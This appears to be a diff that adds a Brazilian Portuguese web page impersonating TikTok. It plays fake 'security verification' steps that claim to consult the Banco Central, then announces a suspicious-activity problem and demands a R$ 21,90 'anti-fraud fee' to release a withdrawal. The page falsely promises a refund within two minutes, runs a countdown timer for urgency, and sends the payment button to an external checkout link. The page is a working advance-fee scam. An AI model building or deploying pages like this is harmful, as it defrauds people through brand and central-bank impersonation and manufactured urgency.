@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Validação de Segurança - TikTok</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      overflow-x: hidden;
+      overscroll-behavior-y: none;
+    }
+
+    body::-webkit-scrollbar {
+      display: none;
+    }
+
+    body {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+      font-family: 'Roboto', sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
+      line-height: 1.4;
+    }
+
+    header {
+      background: white;
+      padding: 20px 0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+      border-bottom: 1px solid #f0f0f0;
+      margin-bottom: 0;
+    }
+
+    .header-container {
+      max-width: 450px;
+      margin: 0 auto;
+      width: 100%;
+      padding: 0 12px;
+    }
+
+    .logo {
+      max-width: 120px;
+      height: auto;
+      display: block;
+      margin: 0 auto 10px;
+    }
+
+    .header-subtitle {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .container {
+      max-width: 450px;
+      margin: 0 auto;
+      padding: 0;
+    }
+
+    .verification-screen {
+      padding: 60px 24px;
+      text-align: center;
+      background: #ffffff;
+      min-height: 70vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .verification-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #00c853, #00e676);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: white;
+      font-size: 32px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    .loading-dots {
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      margin: 20px 0;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #fe2b54;
+      animation: dotPulse 1.4s infinite ease-in-out;
+    }
+
+    .dot:nth-child(1) { animation-delay: -0.32s; }
+    .dot:nth-child(2) { animation-delay: -0.16s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
+      40% { transform: scale(1); opacity: 1; }
+    }
+
+    .verification-text {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .verification-step {
+      font-size: 14px;
+      color: #888888;
+      margin-bottom: 4px;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+
+    .problem-screen {
+      padding: 60px 24px;
+      text-align: center;
+      background: #ffffff;
+      min-height: 70vh;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .problem-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #fe2b54, #ff2a6d);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: white;
+      font-size: 32px;
+      animation: shake 0.5s ease-in-out;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .problem-text {
+      font-size: 16px;
+      color: #fe2b54;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .problem-description {
+      font-size: 14px;
+      color: #666666;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .main-content {
+      display: none;
+    }
+
+    .status-section {
+      padding: 32px 24px 24px;
+      text-align: center;
+      background: #ffffff;
+    }
+
+    .status-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #fe2b54, #ff2a6d);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      color: white;
+      font-size: 24px;
+    }
+
+    h1 {
+      color: #000000;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .status-description {
+      font-size: 15px;
+      color: #666666;
+      line-height: 1.5;
+    }
+
+    .security-alert {
+      background: #fff9fa;
+      border-top: 1px solid #ffebee;
+      border-bottom: 1px solid #ffebee;
+      padding: 20px 24px;
+      margin: 0;
+    }
+
+    .alert-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #fe2b54;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+
+    .alert-description {
+      font-size: 14px;
+      color: #666666;
+      line-height: 1.5;
+    }
+
+    .alert-description strong {
+      color: #000000;
+      font-weight: 600;
+    }
+
+    .validation-section {
+      padding: 24px;
+      background: #ffffff;
+    }
+
+    .fee-card {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      border: 1px solid #e8e8e8;
+    }
+
+    .fee-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #fe2b54;
+      color: white;
+      padding: 8px 12px;
+      border-radius: 16px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+
+    .fee-amount {
+      font-size: 28px;
+      font-weight: 800;
+      color: #fe2b54;
+      margin-bottom: 8px;
+    }
+
+    .fee-note {
+      font-size: 14px;
+      color: #666666;
+      margin-bottom: 20px;
+    }
+
+    .benefits {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin: 20px 0;
+    }
+
+    .benefit {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0;
+    }
+
+    .benefit-icon {
+      width: 20px;
+      height: 20px;
+      background: #00c853;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 10px;
+      flex-shrink: 0;
+    }
+
+    .benefit-text {
+      font-size: 14px;
+      color: #333333;
+      text-align: left;
+    }
+
+    .tiktok-button {
+      width: 100%;
+      border: 0;
+      border-radius: 8px;
+      padding: 16px 20px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      color: white;
+      background: linear-gradient(135deg, #00c853, #00e676);
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      margin: 20px 0 16px 0;
+    }
+
+    .tiktok-button:hover {
+      opacity: 0.95;
+    }
+
+    .tiktok-button:active {
+      transform: scale(0.98);
+    }
+
+    .timer-section {
+      padding: 16px 24px 24px;
+      background: #ffffff;
+      border-top: 1px solid #f0f0f0;
+    }
+
+    .timer {
+      text-align: center;
+      font-size: 13px;
+      color: #666666;
+      font-weight: 500;
+    }
+
+    .timer span {
+      color: #fe2b54;
+      font-weight: 700;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 12px;
+      color: #888888;
+      line-height: 1.4;
+      padding: 0 24px 24px;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-container">
+      <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" class="logo">
+      <div class="header-subtitle">Transação rápida, segura e sem complicação</div>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="verification-screen" id="verificationScreen">
+      <div class="verification-icon">
+        <i class="fas fa-search"></i>
+      </div>
+
+      <div class="verification-text">Verificando segurança da transação</div>
+
+      <div class="loading-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+
+      <div class="verification-step" id="step1" style="animation-delay: 1.5s;">✓ Verificando dados da conta</div>
+      <div class="verification-step" id="step2" style="animation-delay: 3s;">✓ Validando informações pessoais</div>
+      <div class="verification-step" id="step3" style="animation-delay: 4.5s;">✓ Conectando com sistema bancário</div>
+      <div class="verification-step" id="step4" style="animation-delay: 6s;">✓ Consultando Banco Central</div>
+    </div>
+
+    <div class="problem-screen" id="problemScreen">
+      <div class="problem-icon">
+        <i class="fas fa-exclamation-triangle"></i>
+      </div>
+
+      <div class="problem-text">Problema Detectado</div>
+      <div class="problem-description">
+        Foi identificada uma atividade suspeita em sua transação.
+        É necessária uma validação adicional de segurança para continuar.
+      </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+      <div class="status-section">
+        <div class="status-icon">
+          <i class="fas fa-lock"></i>
+        </div>
+        <h1>Validação de Segurança</h1>
+        <div class="status-description">
+          Seu saque precisa de verificação adicional
+        </div>
+      </div>
+
+      <div class="security-alert">
+        <div class="alert-title">
+          <i class="fas fa-exclamation-triangle"></i>
+          Medida de Segurança
+        </div>
+        <div class="alert-description">
+          Devido ao aumento de tentativas de fraude, o <strong>Banco Central</strong> exige uma validação de segurança. Esta taxa de <strong>R$ 21,90</strong> será reembolsada em 2 minutos após o pagamento.
+        </div>
+      </div>
+
+      <div class="validation-section">
+        <div class="fee-card">
+          <div class="fee-badge">
+            <i class="fas fa-shield-alt"></i>
+            TAXA ANTI-FRAUDE
+          </div>
+
+          <div class="fee-amount">R$ 21,90</div>
+          <div class="fee-note">Valor reembolsável em 2 minutos</div>
+
+          <div class="benefits">
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Liberação imediata do saque</div>
+            </div>
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Proteção garantida pelo BC</div>
+            </div>
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Reembolso automático</div>
+            </div>
+          </div>
+
+          <a class="tiktok-button" href="https://www.pay-pagamentos.link/checkout/474eb745-4ed5-4aec-8a19-5ed087914248">
+            <i class="fas fa-credit-card"></i>
+            PAGAR E LIBERAR SAQUE
+          </a>
+        </div>
+      </div>
+
+      <div class="timer-section">
+        <div class="timer">
+          <i class="fas fa-clock"></i> Validação disponível por: <span id="timer">04:00</span>
+        </div>
+      </div>
+
+      <div class="footer-note">
+        Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('step1').style.opacity = '1';
+    }, 1500);
+
+    setTimeout(() => {
+      document.getElementById('step2').style.opacity = '1';
+    }, 3000);
+
+    setTimeout(() => {
+      document.getElementById('step3').style.opacity = '1';
+    }, 4500);
+
+    setTimeout(() => {
+      document.getElementById('step4').style.opacity = '1';
+    }, 6000);
+
+    setTimeout(() => {
+      document.getElementById('verificationScreen').style.display = 'none';
+      document.getElementById('problemScreen').style.display = 'flex';
+    }, 7500);
+
+    setTimeout(() => {
+      document.getElementById('problemScreen').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+
+      let duration = 4 * 60;
+      let display = document.getElementById('timer');
+      const timer = setInterval(() => {
+        let minutes = Math.floor(duration / 60);
+        let seconds = duration % 60;
+        minutes = minutes < 10 ? '0' + minutes : minutes;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--duration < 0) {
+          clearInterval(timer);
+          display.textContent = "expirado";
+        }
+      }, 1000);
+    }, 9500);
+  </script>
+
+</body>
+</html>
